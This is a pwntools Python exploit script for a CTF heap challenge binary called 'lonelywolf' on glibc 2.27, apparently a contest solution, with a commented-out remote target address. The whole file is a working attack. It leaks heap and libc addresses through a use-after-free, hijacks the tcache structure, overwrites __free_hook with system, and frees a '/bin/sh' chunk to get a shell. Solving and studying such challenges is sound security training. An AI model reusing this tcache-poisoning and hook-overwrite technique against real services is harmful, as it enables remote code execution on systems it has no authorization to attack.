from pwn import *
context.log_level="debug"
context.terminal=['tmux','sp','-h']

p= process('./lonelywolf',env={'LD_PRELOAD':'./libc-2.27.so'})
# p=remote('124.71.225.222',25272)
libc=ELF('./libc-2.27.so')

def add(id,size):
    p.sendlineafter('Your choice: ','1')
    p.sendlineafter('Index: ',str(id))
    p.sendlineafter('Size: ',str(size))

def edit(id,content):
    p.sendlineafter('Your choice: ','2')
    p.sendlineafter('Index: ',str(id))
    p.sendlineafter('Content: ',content)

def show(id):
    p.sendlineafter('Your choice: ','3')
    p.sendlineafter('Index: ',str(id))

def delete(id):
    p.sendlineafter('Your choice: ','4')
    p.sendlineafter('Index: ',str(id))

#leak heap addr
add(0,0x60)
delete(0)
add(0,0x60)
delete(0)
edit(0,p64(0)*2)
delete(0)
show(0)
p.recvuntil('Content: ')
heap_base=u64(p.recv(6).ljust(8,'\x00'))-0x260
log.info("heap_base:"+hex(heap_base))

#hijack tcache struct
edit(0,p64(heap_base+0x10))
add(0,0x60)
add(0,0x60)#tcache struct(0x250 unsortedbin)
edit(0,'\x00'*0x20+'\xff'*0x8)


#leak libc 
delete(0)
show(0)
p.recvuntil('Content: ')
main_arena_86=u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
log.info("main_arena_86:"+hex(main_arena_86))
libc_base=main_arena_86-(0x7f7c1c623ca0-0x7f7c1c238000)
log.info("libc_base:"+hex(libc_base))
free_hook=libc_base+libc.symbols['__free_hook']
system=libc_base+libc.symbols['system']

# gdb.attach(p)
# raw_input()

add(0,0x78)
edit(0,'\x00'*0x40)
delete(0)
edit(0,p64(0)*2)
delete(0)
edit(0,p64(free_hook)+p64(0))
add(0,0x78)
add(0,0x78)
edit(0,p64(system))
add(0,0x18)
edit(0,"/bin/sh\x00")
delete(0)

p.interactive()
